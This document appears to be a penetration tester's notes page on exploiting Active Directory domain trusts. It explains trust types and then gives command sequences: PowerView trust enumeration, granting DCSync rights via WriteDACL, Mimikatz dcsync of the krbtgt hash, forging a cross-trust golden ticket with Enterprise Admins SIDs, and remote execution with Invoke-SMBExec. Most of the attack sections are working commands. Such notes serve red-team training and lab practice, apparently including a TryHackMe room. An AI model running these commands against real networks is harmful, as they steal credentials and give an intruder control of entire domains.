# Active Directory Domain Exploitation

_"Note that the Active Directory domain is not the security boundary; the AD forest is."_ - [Sean Metcalf](https://adsecurity.org/?p=1640)

For [[AD-Forest-Exploitation]] - one day...

#### Trust Definitions

For more depth and related information consider reading [[Active-Directory]].

Domain Trust Typology:
- Inbound - Domain A  is trusted by Domain B (Domain A gains access to resources in B) 
- Outbound - Domain A trust is outbound to another Domain B (Domain B gains access to resources in A) 
- Bidirectional - Both Domains A and B trust one another both gains access to resources in each other 
- [Transitive](https://learn.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust) - *"Transitivity determines whether a trust can be extended outside of the two domains with which it was formed.
	- *A transitive trust can be used to extend trust relationships with other domains.*
	- *A non-transitive trust can be used to deny trust relationships with other domains.*"

[harmj0y's](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/) Domain Trust Attack Strategy
1) Enumerate all trusts 
2) Enumerate all users/groups/computers that either:
	- Have access to resources
	- Are in groups or have users from another domain
3) Perform targeted account compromise 

Enumerate with: Bloodhound, .NET methods,  Win32API, LDAP, PowerView.ps1

[snovvcrash.rocks](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/attack-trusts) + [[PowerView-Cheatsheet]]
```powershell
# Get Child domain FQDN
$env:userdnsdomain
# Get Forest Object
PV2 > Get-NetForest [-Forest megacorp.local]
PV3 > Get-Forest [-Forest megacorp.local]
# Get all domains in a forest:
PV2 > Get-NetForestDomain [-Forest megacorp.local]
PV3 > Get-ForestDomain [-Forest megacorp.local]
# Enumerate trusts for current domain via .NET 
nltest /trusted_domains
# Enumerate trusts via Win32 API (PowerView):
PV2 > Get-NetDomainTrust [-Domain megacorp.local] | ft
PV3 > Get-DomainTrust -API [-Domain megacorp.local] | ft
# Enumerate trusts via LDAP (PowerView):
PV2 > Get-NetDomainTrust -LDAP [-Domain megacorp.local] | ft
PV3 > Get-DomainTrust [-Domain megacorp.local] | ft
```
SIDHistory/ExtraSIDs hopping
```powershell
netdom.exe trust $childDomain.$domain.$tld /domain:$domain.$tld /quarantine
```

#### WriteDACL

`WriteDACL` to a domain, give DCSync rights to an unprivileged domain user account
```powershell
AddDomainObjectAcl -TargetIdentity "DC=,DC=local" -PrincipleIdentity $user -Rights DCSync
# Deprecate way
Add-DomainObjectAcl -Credential $Cred -TargetIdentity $domain.local -Rights DCSync
```

#### Ticket Attacks

Consider your options: [[Silver-Tickets]], [[Golden-Tickets]], [[Diamond-Tickets]] and [[Sapphire-Tickets]], but weight up the Opsec concerns. For a cross-trust [[Golden-Tickets]] with [[Mimikatz-Cheatsheet]] or [[Rubeus-Cheatsheet]]
```powershell
# import-module | . .\PowerView.ps1  -- somehow - beware AMSI and Blue
# Get Child domain FQDN:
PS > $env:userdnsdomain
# Child domain's DC machine account and its RID:
PV2 > (Get-NetComputer -ComputerName DC01.$childDomain.$domain.$tld -FullData | select ObjectSID).ObjectSID
PV3 > (Get-DomainComputer DC01.$childDomain.$domain.$tld | select ObjectSID).ObjectSID

# Get child domain SID
PV > Get-DomainSID
# SID of the parent domain
PS > (New-Object System.Security.Principal.NTAccount("megacorp.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
# Create ticket with
# Mimkatz 
# Remember to cycle through exfil and catagorise for data handling
privilege::debug
log
token::elevate
!+
lsadump::dcsync /user:$domainTargeting\krbtgt
# Altered From https://tryhackme.com/room/exploitingad
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<sid of the child dc> /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
# rubeus
```

####  SMBExec.ps1

If you can cross trust and SMB is open a very non-Opsec safe way would be to use [Invoke-TheHash - InvokeSMBExec](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1) to perform command execution over the network to remotely to achieve objectives.  


## References

[THM Room Exploiting AD](https://tryhackme.com/room/exploitingad)
[burmat](https://burmat.gitbook.io/security/hacking/domain-exploitation)
[harmj0y's guide to attacking domain trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
[snovvcrash.rocks](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/attack-trusts)
[Sean Metcalf quote](https://adsecurity.org/?p=1640)